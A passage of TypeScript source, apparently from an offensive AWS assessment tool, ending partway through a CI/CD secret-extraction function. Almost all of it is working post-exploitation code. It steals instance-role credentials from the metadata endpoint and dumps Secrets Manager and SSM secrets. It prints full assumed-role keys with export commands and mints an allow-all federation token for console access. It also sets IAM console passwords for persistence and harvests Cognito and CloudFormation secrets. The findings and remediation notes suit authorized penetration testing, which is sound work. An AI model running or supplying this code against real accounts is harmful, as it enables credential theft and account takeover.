import { aws, argVal, hasFlag, tryJson } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function metadataHarvest(args: string[]): Promise<HookResult> {
  const version = argVal(args, "--imds-version") || "v2"
  const output: string[] = ["[*] Probing EC2 metadata endpoint...\n"]
  const base = "http://169.254.169.254"

  if (version === "v2") {
    try {
      const tokenResp = await fetch(`${base}/latest/api/token`, {
        method: "PUT",
        headers: { "X-aws-ec2-metadata-token-ttl-seconds": "21600" },
        signal: AbortSignal.timeout(5000),
      })
      if (!tokenResp.ok) {
        output.push("[-] IMDSv2 token request failed, trying v1...")
      } else {
        const token = await tokenResp.text()
        const headers = { "X-aws-ec2-metadata-token": token }
        const endpoints: Record<string, string> = {
          instance_id: "/latest/meta-data/instance-id",
          ami_id: "/latest/meta-data/ami-id",
          hostname: "/latest/meta-data/hostname",
          iam_role: "/latest/meta-data/iam/security-credentials/",
          public_ip: "/latest/meta-data/public-ipv4",
          account_id: "/latest/dynamic/instance-identity/document",
        }
        for (const [name, path] of Object.entries(endpoints)) {
          const resp = await fetch(`${base}${path}`, { headers, signal: AbortSignal.timeout(5000) })
          if (resp.ok) {
            const text = await resp.text()
            output.push(`[+] ${name}: ${text.slice(0, 120)}${text.length > 120 ? "..." : ""}`)
            if (name === "iam_role" && text.trim()) {
              const roleName = text.trim().split("\n")[0]
              const creds = await fetch(`${base}/latest/meta-data/iam/security-credentials/${roleName}`, {
                headers,
                signal: AbortSignal.timeout(5000),
              })
              if (creds.ok) {
                const c = await creds.json() as Record<string, unknown>
                output.push(
                  `[+] credentials: AccessKeyId=${String(c.AccessKeyId).slice(0, 8)}... Token=${String(c.Token).slice(0, 20)}...`,
                )
              }
            }
          } else {
            output.push(`[-] ${name}: HTTP ${resp.status}`)
          }
        }
        return { output: output.join("\n"), findings: [] }
      }
    } catch {
      output.push("[-] Cannot reach metadata endpoint (not on EC2?)")
      return { output: output.join("\n"), findings: [] }
    }
  }

  try {
    const endpoints: Record<string, string> = {
      instance_id: "/latest/meta-data/instance-id",
      iam_role: "/latest/meta-data/iam/security-credentials/",
      public_ip: "/latest/meta-data/public-ipv4",
    }
    for (const [name, path] of Object.entries(endpoints)) {
      const resp = await fetch(`${base}${path}`, { signal: AbortSignal.timeout(5000) })
      if (resp.ok) output.push(`[+] ${name}: ${(await resp.text()).slice(0, 120)}`)
      else output.push(`[-] ${name}: HTTP ${resp.status}`)
    }
  } catch {
    output.push("[-] Cannot reach metadata endpoint (not on EC2?)")
  }

  return { output: output.join("\n"), findings: [] }
}

export async function secretsDump(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const service = argVal(args, "--service") || "all"
  const output: string[] = ["[*] AWS Secrets Dump\n"]

  if (service === "secretsmanager" || service === "all") {
    const r = await aws(
      ["secretsmanager", "list-secrets", "--query", "SecretList[].[Name,ARN]"],
      profile,
      region,
      timeout,
    )
    if (r.exitCode === 0) {
      const secrets = tryJson(r.stdout) || []
      output.push(`[+] Secrets Manager: ${secrets.length} secret(s)`)
      for (const s of secrets) {
        const val = await aws(
          ["secretsmanager", "get-secret-value", "--secret-id", s[0], "--query", "SecretString"],
          profile,
          region,
          timeout,
        )
        if (val.exitCode === 0) {
          const v = tryJson(val.stdout) || val.stdout
          output.push(`[+] ${s[0]}: [SECRET FOUND — ${String(v).length} chars]`)
        } else {
          output.push(`[-] ${s[0]}: access denied`)
        }
      }
    }
  }

  if (service === "ssm" || service === "all") {
    const r = await aws(["ssm", "describe-parameters", "--query", "Parameters[].[Name,Type]"], profile, region, timeout)
    if (r.exitCode === 0) {
      const params = tryJson(r.stdout) || []
      const secure = params.filter((p: string[]) => p[1] === "SecureString")
      output.push(`[+] SSM Parameters: ${params.length} total, ${secure.length} SecureString`)
      for (const p of secure) {
        const val = await aws(
          ["ssm", "get-parameter", "--name", p[0], "--with-decryption", "--query", "Parameter.Value"],
          profile,
          region,
          timeout,
        )
        if (val.exitCode === 0) {
          const v = tryJson(val.stdout) || val.stdout
          output.push(`[+] ${p[0]}: [SECRET FOUND — ${String(v).length} chars]`)
        } else {
          output.push(`[-] ${p[0]}: access denied`)
        }
      }
    }
  }

  return { output: output.join("\n"), findings: [] }
}

export async function accessKeyEnum(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] IAM Access Key Enumeration\n"]

  const users = await aws(["iam", "list-users", "--query", "Users[].UserName"], profile, region, timeout)
  if (users.exitCode !== 0) return { output: `[-] Cannot list users: ${users.stderr.trim()}`, findings }
  const ul = tryJson(users.stdout) || []
  output.push(`[+] Users: ${ul.length}\n`)

  let total = 0
  let active = 0
  for (const username of ul) {
    const keys = await aws(
      [
        "iam",
        "list-access-keys",
        "--user-name",
        username,
        "--query",
        "AccessKeyMetadata[].[AccessKeyId,Status,CreateDate]",
      ],
      profile,
      region,
      timeout,
    )
    if (keys.exitCode !== 0) continue
    const kl = tryJson(keys.stdout) || []
    for (const k of kl) {
      total++
      if (k[1] === "Active") active++

      const lastUsed = await aws(["iam", "get-access-key-last-used", "--access-key-id", k[0]], profile, region, timeout)
      const lu = tryJson(lastUsed.stdout)?.AccessKeyLastUsed || {}
      const created = new Date(k[2])
      const age = Math.floor((Date.now() - created.getTime()) / (1000 * 60 * 60 * 24))

      output.push(
        `    ${username}: ${k[0]} — ${k[1]} — age: ${age}d — last used: ${lu.LastUsedDate || "never"} (${lu.ServiceName || "none"})`,
      )

      if (k[1] === "Active" && age > 90) {
        findings.push({
          checkId: "AWS-CRED-001",
          provider: "aws",
          severity: "high",
          status: "FAIL",
          resource: `iam:${username}:${k[0]}`,
          title: `Old active access key: ${username}/${k[0]}`,
          details: `Key is ${age} days old and still active`,
          remediation: "Rotate access key (max 90 day age recommended)",
        })
      }

      if (k[1] === "Active" && (!lu.LastUsedDate || lu.ServiceName === "N/A")) {
        findings.push({
          checkId: "AWS-CRED-002",
          provider: "aws",
          severity: "medium",
          status: "FAIL",
          resource: `iam:${username}:${k[0]}`,
          title: `Unused active access key: ${username}/${k[0]}`,
          details: `Active key has never been used`,
          remediation: "Deactivate or delete unused access keys",
        })
      }
    }
  }

  output.push(`\n[*] Summary: ${total} keys total, ${active} active`)
  return { output: output.join("\n"), findings }
}

export async function roleCredential(args: string[], timeout: number): Promise<HookResult> {
  const roleArn = argVal(args, "--role-arn")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const sessionName = argVal(args, "--session-name") || "cyberstrike"
  const duration = argVal(args, "--duration") || "3600"
  const externalId = argVal(args, "--external-id")

  if (!roleArn) return { output: "ERROR: --role-arn required", findings: [] }

  const cmdArgs = [
    "sts",
    "assume-role",
    "--role-arn",
    roleArn,
    "--role-session-name",
    sessionName,
    "--duration-seconds",
    duration,
  ]
  if (externalId) cmdArgs.push("--external-id", externalId)

  const r = await aws(cmdArgs, profile, region, timeout)
  if (r.exitCode !== 0) return { output: `[-] AssumeRole failed: ${r.stderr.trim()}`, findings: [] }

  const creds = tryJson(r.stdout)?.Credentials
  if (!creds) return { output: "[-] No credentials returned", findings: [] }

  const output = [
    `[+] AssumeRole successful: ${roleArn}`,
    `    AccessKeyId: ${creds.AccessKeyId}`,
    `    SecretAccessKey: ${creds.SecretAccessKey}`,
    `    SessionToken: ${String(creds.SessionToken).slice(0, 40)}...`,
    `    Expiration: ${creds.Expiration}`,
    `\n[*] Export credentials:`,
    `    export AWS_ACCESS_KEY_ID=${creds.AccessKeyId}`,
    `    export AWS_SECRET_ACCESS_KEY=${creds.SecretAccessKey}`,
    `    export AWS_SESSION_TOKEN=${creds.SessionToken}`,
  ]

  return {
    output: output.join("\n"),
    findings: [
      {
        checkId: "AWS-CRED-003",
        provider: "aws",
        severity: "high",
        status: "OBTAINED",
        resource: roleArn,
        title: `Assumed role: ${roleArn}`,
        details: `Obtained temporary credentials via AssumeRole, expires ${creds.Expiration}`,
        remediation: "Review trust policy for overly permissive principal",
      },
    ],
  }
}

export async function federationToken(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const name = argVal(args, "--name") || "cyberstrike"
  const duration = argVal(args, "--duration") || "43200"

  const r = await aws(
    [
      "sts",
      "get-federation-token",
      "--name",
      name,
      "--duration-seconds",
      duration,
      "--policy",
      JSON.stringify({
        Version: "2012-10-17",
        Statement: [{ Effect: "Allow", Action: "*", Resource: "*" }],
      }),
    ],
    profile,
    region,
    timeout,
  )

  if (r.exitCode !== 0) return { output: `[-] GetFederationToken failed: ${r.stderr.trim()}`, findings: [] }

  const result = tryJson(r.stdout)
  const creds = result?.Credentials
  const fedUser = result?.FederatedUser
  if (!creds) return { output: "[-] No credentials returned", findings: [] }

  const signinToken = Buffer.from(
    JSON.stringify({
      sessionId: creds.AccessKeyId,
      sessionKey: creds.SecretAccessKey,
      sessionToken: creds.SessionToken,
    }),
  ).toString("base64")

  const output = [
    `[+] Federation token obtained`,
    `    Federated User: ${fedUser?.FederatedUserId}`,
    `    ARN: ${fedUser?.Arn}`,
    `    AccessKeyId: ${creds.AccessKeyId}`,
    `    Expiration: ${creds.Expiration}`,
    `\n[*] For console access, use the federation endpoint:`,
    `    https://signin.aws.amazon.com/federation?Action=getSigninToken&Session=${encodeURIComponent(JSON.stringify({ sessionId: creds.AccessKeyId, sessionKey: creds.SecretAccessKey, sessionToken: creds.SessionToken }))}`,
  ]

  return {
    output: output.join("\n"),
    findings: [
      {
        checkId: "AWS-CRED-004",
        provider: "aws",
        severity: "high",
        status: "OBTAINED",
        resource: fedUser?.Arn || "federation",
        title: `Federation token obtained: ${name}`,
        details: `Console access possible via federation endpoint, expires ${creds.Expiration}`,
        remediation: "Restrict GetFederationToken permissions",
      },
    ],
  }
}

export async function ecrToken(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const output: string[] = ["[*] ECR Registry Token Extraction\n"]
  const findings: Finding[] = []

  const auth = await aws(
    ["ecr", "get-authorization-token", "--query", "authorizationData[].[proxyEndpoint,expiresAt,authorizationToken]"],
    profile,
    region,
    timeout,
  )
  if (auth.exitCode !== 0) return { output: `[-] Cannot get ECR token: ${auth.stderr.trim()}`, findings }

  const tokens = tryJson(auth.stdout) || []
  for (const t of tokens) {
    const decoded = Buffer.from(t[2] || "", "base64").toString("utf-8")
    const [user, pass] = decoded.split(":")
    output.push(`[+] Registry: ${t[0]}`)
    output.push(`    Expires: ${t[1]}`)
    output.push(`    Username: ${user}`)
    output.push(`    Password: ${String(pass).slice(0, 30)}...`)
    output.push(`\n    docker login -u ${user} -p "${String(pass).slice(0, 20)}..." ${t[0]}`)
    findings.push({
      checkId: "AWS-CRED-005",
      provider: "aws",
      severity: "high",
      status: "OBTAINED",
      resource: t[0] || "ecr",
      title: `ECR auth token extracted: ${t[0]}`,
      details: `Docker registry credentials obtained, expires ${t[1]}`,
      remediation: "Review ECR access permissions",
    })
  }

  const repos = await aws(
    [
      "ecr",
      "describe-repositories",
      "--query",
      "repositories[].[repositoryName,repositoryUri,imageScanningConfiguration.scanOnPush]",
    ],
    profile,
    region,
    timeout,
  )
  if (repos.exitCode === 0) {
    const rl = tryJson(repos.stdout) || []
    output.push(`\n[+] Repositories: ${rl.length}`)
    for (const r of rl) {
      output.push(`    ${r[0]} — ${r[1]}${!r[2] ? " [NO SCAN]" : ""}`)
      const images = await aws(
        ["ecr", "list-images", "--repository-name", r[0], "--query", "imageIds[].imageTag"],
        profile,
        region,
        timeout,
      )
      if (images.exitCode === 0) {
        const il = (tryJson(images.stdout) || []).filter(Boolean)
        output.push(`      Tags: ${il.slice(0, 10).join(", ")}${il.length > 10 ? ` (+${il.length - 10} more)` : ""}`)
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function consoleLogin(args: string[], timeout: number): Promise<HookResult> {
  const username = argVal(args, "--user-name")
  const password = argVal(args, "--password")
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")

  if (!username) return { output: "ERROR: --user-name required", findings: [] }

  const pw = password || `CyStr!ke${Date.now().toString(36)}`

  const existing = await aws(["iam", "get-login-profile", "--user-name", username], profile, region, timeout)

  if (existing.exitCode === 0) {
    const r = await aws(
      ["iam", "update-login-profile", "--user-name", username, "--password", pw, "--no-password-reset-required"],
      profile,
      region,
      timeout,
    )
    if (r.exitCode !== 0) return { output: `[-] update-login-profile failed: ${r.stderr.trim()}`, findings: [] }
    return {
      output: `[+] Console login updated for ${username}\n    Password: ${pw}`,
      findings: [
        {
          checkId: "AWS-CRED-006",
          provider: "aws",
          severity: "critical",
          status: "MODIFIED",
          resource: `iam:${username}`,
          title: `Console password updated: ${username}`,
          details: `Password changed for IAM user ${username}`,
          remediation: "Reset password and enable MFA",
        },
      ],
    }
  }

  const r = await aws(
    ["iam", "create-login-profile", "--user-name", username, "--password", pw, "--no-password-reset-required"],
    profile,
    region,
    timeout,
  )
  if (r.exitCode !== 0) return { output: `[-] create-login-profile failed: ${r.stderr.trim()}`, findings: [] }

  const id = await aws(["sts", "get-caller-identity", "--query", "Account"], profile, region, timeout)
  const account = tryJson(id.stdout)

  return {
    output: [
      `[+] Console login created for ${username}`,
      `    Password: ${pw}`,
      `    Console URL: https://${account || "ACCOUNT_ID"}.signin.aws.amazon.com/console`,
    ].join("\n"),
    findings: [
      {
        checkId: "AWS-CRED-007",
        provider: "aws",
        severity: "critical",
        status: "CREATED",
        resource: `iam:${username}`,
        title: `Console login profile created: ${username}`,
        details: `New console access for IAM user ${username}`,
        remediation: "Delete login profile: aws iam delete-login-profile",
      },
    ],
  }
}

export async function cognitoToken(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const poolId = argVal(args, "--user-pool-id")
  const identityPoolId = argVal(args, "--identity-pool-id")
  const findings: Finding[] = []
  const output: string[] = ["[*] Cognito Token Extraction\n"]

  if (!poolId && !identityPoolId) {
    const pools = await aws(
      ["cognito-idp", "list-user-pools", "--max-results", "20", "--query", "UserPools[].[Id,Name]"],
      profile,
      region,
      timeout,
    )
    if (pools.exitCode === 0) {
      const pl = tryJson(pools.stdout) || []
      output.push(`[+] User Pools: ${pl.length}`)
      for (const p of pl) output.push(`    ${p[0]} — ${p[1]}`)
    }

    const idPools = await aws(
      [
        "cognito-identity",
        "list-identity-pools",
        "--max-results",
        "20",
        "--query",
        "IdentityPools[].[IdentityPoolId,IdentityPoolName]",
      ],
      profile,
      region,
      timeout,
    )
    if (idPools.exitCode === 0) {
      const ipl = tryJson(idPools.stdout) || []
      output.push(`\n[+] Identity Pools: ${ipl.length}`)
      for (const p of ipl) {
        output.push(`    ${p[0]} — ${p[1]}`)
        const desc = await aws(
          ["cognito-identity", "describe-identity-pool", "--identity-pool-id", p[0]],
          profile,
          region,
          timeout,
        )
        if (desc.exitCode === 0) {
          const pool = tryJson(desc.stdout)
          if (pool?.AllowUnauthenticatedIdentities) {
            output.push(`    [!] Unauthenticated access enabled`)
            findings.push({
              checkId: "AWS-COGNITO-001",
              provider: "aws",
              severity: "high",
              status: "FAIL",
              resource: `cognito:${p[0]}`,
              title: `Unauthenticated identity pool: ${p[1]}`,
              details: `Identity pool ${p[0]} allows unauthenticated identities`,
              remediation: "Disable unauthenticated access unless required",
            })
          }
        }
      }
    }

    output.push("\n[*] Use --user-pool-id or --identity-pool-id for deeper enumeration")
    return { output: output.join("\n"), findings }
  }

  if (poolId) {
    const desc = await aws(["cognito-idp", "describe-user-pool", "--user-pool-id", poolId], profile, region, timeout)
    if (desc.exitCode === 0) {
      const pool = tryJson(desc.stdout)?.UserPool
      output.push(`[+] User Pool: ${pool?.Name} (${poolId})`)
      output.push(`    MFA: ${pool?.MfaConfiguration}`)
      output.push(`    Users: ${pool?.EstimatedNumberOfUsers}`)
    }

    const users = await aws(
      [
        "cognito-idp",
        "list-users",
        "--user-pool-id",
        poolId,
        "--query",
        "Users[].[Username,UserStatus,Enabled,Attributes]",
      ],
      profile,
      region,
      timeout,
    )
    if (users.exitCode === 0) {
      const ul = tryJson(users.stdout) || []
      output.push(`\n[+] Users: ${ul.length}`)
      for (const u of ul.slice(0, 30)) {
        const email = (u[3] || []).find((a: Record<string, string>) => a.Name === "email")?.Value || ""
        output.push(`    ${u[0]} — ${u[1]}${!u[2] ? " [DISABLED]" : ""} — ${email}`)
      }
    }

    const clients = await aws(
      [
        "cognito-idp",
        "list-user-pool-clients",
        "--user-pool-id",
        poolId,
        "--query",
        "UserPoolClients[].[ClientId,ClientName]",
      ],
      profile,
      region,
      timeout,
    )
    if (clients.exitCode === 0) {
      const cl = tryJson(clients.stdout) || []
      output.push(`\n[+] App Clients: ${cl.length}`)
      for (const c of cl) {
        output.push(`    ${c[0]} — ${c[1]}`)
        const clientDesc = await aws(
          ["cognito-idp", "describe-user-pool-client", "--user-pool-id", poolId, "--client-id", c[0]],
          profile,
          region,
          timeout,
        )
        if (clientDesc.exitCode === 0) {
          const client = tryJson(clientDesc.stdout)?.UserPoolClient
          if (client?.ClientSecret) {
            output.push(`    [!] Client secret: [SECRET FOUND — ${String(client.ClientSecret).length} chars]`)
            findings.push({
              checkId: "AWS-COGNITO-002",
              provider: "aws",
              severity: "high",
              status: "OBTAINED",
              resource: `cognito:client:${c[0]}`,
              title: `Cognito client secret extracted: ${c[1]}`,
              details: `App client ${c[0]} secret obtained`,
              remediation: "Rotate client secret and restrict DescribeUserPoolClient",
            })
          }
        }
      }
    }
  }

  if (identityPoolId) {
    const getId = await aws(
      ["cognito-identity", "get-id", "--identity-pool-id", identityPoolId],
      profile,
      region,
      timeout,
    )
    if (getId.exitCode === 0) {
      const identityId = tryJson(getId.stdout)?.IdentityId
      if (identityId) {
        output.push(`\n[+] Got identity: ${identityId}`)
        const creds = await aws(
          ["cognito-identity", "get-credentials-for-identity", "--identity-id", identityId],
          profile,
          region,
          timeout,
        )
        if (creds.exitCode === 0) {
          const c = tryJson(creds.stdout)?.Credentials
          if (c) {
            output.push(`[+] AWS Credentials from identity pool:`)
            output.push(`    AccessKeyId: ${c.AccessKeyId}`)
            output.push(`    SecretKey: ${String(c.SecretKey).slice(0, 20)}...`)
            output.push(`    Expiration: ${c.Expiration}`)
            findings.push({
              checkId: "AWS-COGNITO-003",
              provider: "aws",
              severity: "critical",
              status: "OBTAINED",
              resource: `cognito:identity:${identityId}`,
              title: `AWS credentials from Cognito identity pool`,
              details: `Obtained AWS credentials via unauthenticated identity pool access`,
              remediation: "Disable unauthenticated access or restrict IAM role permissions",
            })
          }
        }
      }
    }
  }

  return { output: output.join("\n"), findings }
}

export async function cfnSecretExtract(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const stackName = argVal(args, "--stack-name")
  const findings: Finding[] = []
  const output: string[] = ["[*] CloudFormation Secret Extraction\n"]

  const secretPattern =
    /(?:password|secret|key|token|api.?key|credential|connection.?string|db.?pass|rds.?pass|auth|private|master)/i

  const listCmd = stackName
    ? ["cloudformation", "describe-stacks", "--stack-name", stackName, "--query", "Stacks[].[StackName,StackStatus]"]
    : [
        "cloudformation",
        "list-stacks",
        "--stack-status-filter",
        "CREATE_COMPLETE",
        "UPDATE_COMPLETE",
        "--query",
        "StackSummaries[].[StackName,StackStatus]",
      ]
  const stacks = await aws(listCmd, profile, region, timeout)
  if (stacks.exitCode !== 0)
    return { output: output.join("\n") + "\n[-] Access denied: cloudformation:ListStacks", findings }

  const sl = tryJson(stacks.stdout) || []
  output.push(`[+] Scanning ${sl.length} stacks for secrets...\n`)

  for (const s of sl) {
    const name = s[0]

    const params = await aws(
      ["cloudformation", "describe-stacks", "--stack-name", name, "--query", "Stacks[0].Parameters"],
      profile,
      region,
      timeout,
    )
    if (params.exitCode === 0) {
      const pl = tryJson(params.stdout) || []
      for (const p of pl) {
        if (secretPattern.test(p.ParameterKey)) {
          if (p.ParameterValue && p.ParameterValue !== "****") {
            output.push(`  [!] ${name} / ${p.ParameterKey} = [SECRET FOUND — ${String(p.ParameterValue).length} chars]`)
            findings.push({
              checkId: "AWS-CFNSEC-001",
              provider: "aws",
              severity: "critical",
              status: "EXTRACTED",
              resource: `cfn:${name}:${p.ParameterKey}`,
              title: `Secret parameter exposed: ${p.ParameterKey}`,
              details: `Stack ${name} parameter ${p.ParameterKey}: [SECRET FOUND — ${String(p.ParameterValue).length} chars]`,
              remediation: "Rotate credential immediately, use SSM SecureString dynamic reference",
            })
          } else {
            output.push(`  [*] ${name} / ${p.ParameterKey} = **** (NoEcho — try get-template)`)
          }
        }
      }
    }

    const tpl = await aws(
      ["cloudformation", "get-template", "--stack-name", name, "--query", "TemplateBody"],
      profile,
      region,
      timeout,
    )
    if (tpl.exitCode === 0) {
      const body = tpl.stdout
      const lines = body.split("\n")
      for (let i = 0; i < lines.length; i++) {
        if (secretPattern.test(lines[i])) {
          const ctx = lines
            .slice(Math.max(0, i - 1), Math.min(lines.length, i + 3))
            .join("\n")
            .trim()
          if (ctx.length > 10 && !ctx.includes("NoEcho") && !ctx.includes("AWS::SSM::Parameter")) {
            output.push(`  [!] ${name} template line ${i + 1}: ${lines[i].trim().slice(0, 100)}`)
            findings.push({
              checkId: "AWS-CFNSEC-002",
              provider: "aws",
              severity: "high",
              status: "FOUND",
              resource: `cfn:template:${name}:line${i + 1}`,
              title: `Potential hardcoded secret in template: ${name}`,
              details: `Line ${i + 1}: ${lines[i].trim().slice(0, 80)}`,
              remediation: "Replace hardcoded values with dynamic references",
            })
          }
        }
      }

      const defaultRegex = /Default["']?\s*[:=]\s*["']([^"'\n]{8,})["']/g
      let match
      while ((match = defaultRegex.exec(body)) !== null) {
        const pre = body.slice(Math.max(0, match.index - 200), match.index)
        if (secretPattern.test(pre)) {
          output.push(`  [!] ${name} default value: [SECRET FOUND — ${match[1].length} chars]`)
          findings.push({
            checkId: "AWS-CFNSEC-003",
            provider: "aws",
            severity: "high",
            status: "FOUND",
            resource: `cfn:default:${name}`,
            title: `Default parameter value with potential secret in ${name}`,
            details: `Default value near secret-named parameter: [SECRET FOUND — ${match[1].length} chars]`,
            remediation: "Remove default values for sensitive parameters",
          })
        }
      }
    }

    const outputs = await aws(
      ["cloudformation", "describe-stacks", "--stack-name", name, "--query", "Stacks[0].Outputs"],
      profile,
      region,
      timeout,
    )
    if (outputs.exitCode === 0) {
      for (const o of tryJson(outputs.stdout) || []) {
        if (secretPattern.test(o.OutputKey) && o.OutputValue) {
          output.push(`  [!] ${name} output ${o.OutputKey} = [SECRET FOUND — ${String(o.OutputValue).length} chars]`)
          findings.push({
            checkId: "AWS-CFNSEC-004",
            provider: "aws",
            severity: "high",
            status: "EXPOSED",
            resource: `cfn:output:${name}:${o.OutputKey}`,
            title: `Secret in stack output: ${o.OutputKey}`,
            details: `Output ${o.OutputKey}: [SECRET FOUND — ${String(o.OutputValue).length} chars]${o.ExportName ? ` (exported as: ${o.ExportName})` : ""}`,
            remediation: "Do not expose secrets via stack outputs — use SSM/Secrets Manager",
          })
        }
      }
    }
  }

  output.push(`\n[+] Scan complete: ${findings.length} potential secrets found`)
  return { output: output.join("\n"), findings }
}

export async function codecommitCred(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] CodeCommit Credential Enumeration\n"]

  const repos = await aws(
    ["codecommit", "list-repositories", "--query", "repositories[].[repositoryName,repositoryId]"],
    profile,
    region,
    timeout,
  )
  if (repos.exitCode === 0) {
    const rl = tryJson(repos.stdout) || []
    output.push(`[+] CodeCommit Repositories: ${rl.length}`)
    for (const r of rl) {
      const detail = await aws(
        [
          "codecommit",
          "get-repository",
          "--repository-name",
          r[0],
          "--query",
          "repositoryMetadata.{cloneUrl:cloneUrlHttp,sshUrl:cloneUrlSsh,defaultBranch:defaultBranch,lastModified:lastModifiedDate}",
        ],
        profile,
        region,
        timeout,
      )
      if (detail.exitCode === 0) {
        const d = tryJson(detail.stdout)
        if (d) {
          output.push(`  ${r[0]}  Branch: ${d.defaultBranch || "N/A"}  Modified: ${d.lastModified || "N/A"}`)
          output.push(`    HTTPS: ${d.cloneUrl}`)
          output.push(`    SSH: ${d.sshUrl}`)
        }
      }
    }
  }

  const users = await aws(["iam", "list-users", "--query", "Users[].UserName"], profile, region, timeout)
  if (users.exitCode === 0) {
    const ul = tryJson(users.stdout) || []
    output.push(`\n[+] Checking ${ul.length} IAM users for CodeCommit credentials...`)

    for (const user of ul) {
      const creds = await aws(
        [
          "iam",
          "list-service-specific-credentials",
          "--user-name",
          user,
          "--service-name",
          "codecommit.amazonaws.com",
          "--query",
          "ServiceSpecificCredentials[].[ServiceUserName,ServiceSpecificCredentialId,Status,CreateDate]",
        ],
        profile,
        region,
        timeout,
      )
      if (creds.exitCode === 0) {
        const cl = tryJson(creds.stdout) || []
        for (const c of cl) {
          output.push(`  [!] ${user}: HTTPS Git credential ${c[0]} (${c[1]})  Status: ${c[2]}  Created: ${c[3]}`)
          findings.push({
            checkId: "AWS-CODECOMMIT-001",
            provider: "aws",
            severity: "high",
            status: "FOUND",
            resource: `codecommit:cred:${user}:${c[1]}`,
            title: `CodeCommit HTTPS credential for user: ${user}`,
            details: `Service username: ${c[0]}, Status: ${c[2]}, Created: ${c[3]}`,
            remediation: "Rotate CodeCommit credentials, use IAM role-based access instead",
          })
        }
      }

      const sshKeys = await aws(
        [
          "iam",
          "list-ssh-public-keys",
          "--user-name",
          user,
          "--query",
          "SSHPublicKeys[].[SSHPublicKeyId,Status,UploadDate]",
        ],
        profile,
        region,
        timeout,
      )
      if (sshKeys.exitCode === 0) {
        const sl = tryJson(sshKeys.stdout) || []
        for (const s of sl) {
          output.push(`  [!] ${user}: SSH public key ${s[0]}  Status: ${s[1]}  Uploaded: ${s[2]}`)
          findings.push({
            checkId: "AWS-CODECOMMIT-002",
            provider: "aws",
            severity: "medium",
            status: "FOUND",
            resource: `codecommit:ssh:${user}:${s[0]}`,
            title: `SSH public key for CodeCommit: ${user}`,
            details: `Key ID: ${s[0]}, Status: ${s[1]}`,
            remediation: "Review SSH key usage and remove unused keys",
          })
        }
      }
    }
  }

  const connToken = await aws(
    ["codecommit", "get-repository", "--repository-name", "nonexistent-probe-12345"],
    profile,
    region,
    timeout,
  )
  if (connToken.exitCode !== 0 && connToken.stderr.includes("does not exist")) {
    output.push(`\n[+] Credential has codecommit:GetRepository access — can clone repos`)
  }

  return { output: output.join("\n"), findings }
}

export async function ciCdSecretExtract(args: string[], timeout: number): Promise<HookResult> {
  const profile = argVal(args, "--profile")
  const region = argVal(args, "--region")
  const findings: Finding[] = []
  const output: string[] = ["[*] CI/CD Secret Extraction (CodePipeline + CodeBuild)\n"]

  const secretPattern = /(?:password|secret|key|token|api.?key|credential|private|auth|db.?pass)/i

  const pipelines = await aws(
    ["codepipeline", "list-pipelines", "--query", "pipelines[].[name,created,updated]"],
    profile,
    region,
    timeout,
  )
  if (pipelines.exitCode === 0) {
    const pl = tryJson(pipelines.stdout) || []
    output.push(`[+] CodePipeline pipelines: ${pl.length}`)

    for (const p of pl) {
      output.push(`\n  Pipeline: ${p[0]}  Created: ${p[1]}`)
      const detail = await aws(["codepipeline", "get-pipeline", "--name", p[0]], profile, region, timeout)
      if (detail.exitCode === 0) {
        const d = tryJson(detail.stdout)
        const artifactStore = d?.pipeline?.artifactStore
        if (artifactStore) {
          output.push(`    Artifact bucket: ${artifactStore.location}  Type: ${artifactStore.type}`)
          if (artifactStore.encryptionKey) {
            output.push(`    Encryption: ${artifactStore.encryptionKey.type} ${artifactStore.encryptionKey.id}`)
          } else {
            output.push(`    [!] Artifacts not KMS-encrypted`)
          }
          findings.push({
            checkId: "AWS-CICD-001",
            provider: "aws",
            severity: "high",
            status: "FOUND",
            resource: `codepipeline:artifact:${artifactStore.location}`,
            title: `Pipeline artifact bucket: ${artifactStore.location}`,
            details: `Pipeline ${p[0]} stores build artifacts — may contain compiled code, configs, secrets`,
            remediation: "Restrict access to artifact bucket, enable KMS encryption",
          })
        }

        const stages = d?.pipeline?.stages || []
        for (const stage of stages) {
          for (const action of stage.actions || []) {
            const config = action.configuration || {}
            for (const [k, v] of Object.entries(config)) {
              if (secretPattern.test(k) && v) {
                output.push(`    [!] ${stage.name}/${action.name}: ${k} = [SECRET FOUND — ${String(v).length} chars]`)
                findings.push({
                  checkId: "AWS-CICD-002",
                  provider: "aws",
                  severity: "critical",
                  status: "EXTRACTED",
                  resource: `codepipeline:${p[0]}:${stage.name}:${action.name}`,
                  title: `Pipeline action config secret: ${k}`,
                  details: `Stage ${stage.name}, Action ${action.name}: ${k} [SECRET FOUND — ${String(v).length} chars]`,
                  remediation: "Use Secrets Manager reference instead of plaintext",
                })
              }
            }
          }
        }
      }
    }
  }

  const projects = await aws(["codebuild", "list-projects", "--query", "projects"], profile, region, timeout)
  if (projects.exitCode === 0) {
    const prl = tryJson(projects.stdout) || []
    output.push(`\n[+] CodeBuild projects: ${prl.length}`)

    for (const name of prl) {
      const detail = await aws(
        [
          "codebuild",
          "batch-get-projects",
          "--names",
          name,
          "--query",
          "projects[0].{env:environment,source:source.type,serviceRole:serviceRole,artifacts:artifacts.type}",
        ],
        profile,
        region,
        timeout,
      )
      if (detail.exitCode === 0) {
        const d = tryJson(detail.stdout)
        if (d) {
          output.push(`\n  Project: ${name}  Source: ${d.source}  Artifacts: ${d.artifacts}`)
          output.push(`    Service role: ${d.serviceRole}`)

          const envVars = d.env?.environmentVariables || []
          for (const ev of envVars) {
            const isSecret = secretPattern.test(ev.name)
            if (ev.type === "PLAINTEXT" && isSecret) {
